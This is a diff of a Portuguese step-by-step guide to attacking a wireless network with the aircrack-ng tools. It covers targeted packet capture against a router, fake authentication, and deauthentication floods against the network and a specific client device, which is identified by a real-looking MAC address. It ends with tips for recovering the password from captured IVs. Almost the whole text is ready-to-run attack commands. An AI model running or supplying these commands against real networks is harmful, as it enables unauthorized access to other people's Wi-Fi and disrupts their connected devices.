@@ -25,20 +25,20 @@ airodump-ng wlan0mon
 
 #5 - Descobrir o alvo e fazer a identificação 
 Anotar o BSSID (mac do roteador) e o Chanal
-C0:3D:D9:8F:93:40 e canal 11
+CC:XX:XX:XX:XX:XX e canal 11
 
 #6A - Iniciar a captura focada no alvo - Terminal 1
 
-airodump-ng --bssid C0:3D:D9:8F:93:40 -c 11 -w captura_salva wlan0mon
+airodump-ng --bssid CC:XX:XX:XX:XX:XX -c 11 -w captura_salva wlan0mon
 
 #6B - Realizar diversas falsas autenticação com o ponto de acesso - Terminal 2
 
-aireplay-ng -1 0 -a --bssid C0:3D:D9:8F:93:40 wlan0mon
+aireplay-ng -1 0 -a --bssid CC:XX:XX:XX:XX:XX wlan0mon
 
 #7B - Iniciar ataque de desautenticação da rede focado em um dispositivo apenas
 
-aireplay-ng -0 150 -a C0:3D:D9:8F:93:40 -c 00:16:D0:39:57:6B wlan0mon
-aireplay-ng -0 150 -a C0:3D:D9:8F:93:40 wlan0mon
+aireplay-ng -0 150 -a CC:XX:XX:XX:XX:XX -c 00:16:D0:39:57:6B wlan0mon
+aireplay-ng -0 150 -a CC:XX:XX:XX:XX:XX wlan0mon
 
 #8 - Parar a leitura / Parar o ataque - Terminal 1 e Terminal 2
 
@@ -59,3 +59,4 @@ NOTAS
 
 1 - É rápido descobrir a senha (5 dígitos) se o número de IVs for alto
 2 - Gerar um alto número de IVs na etapa de análise
+
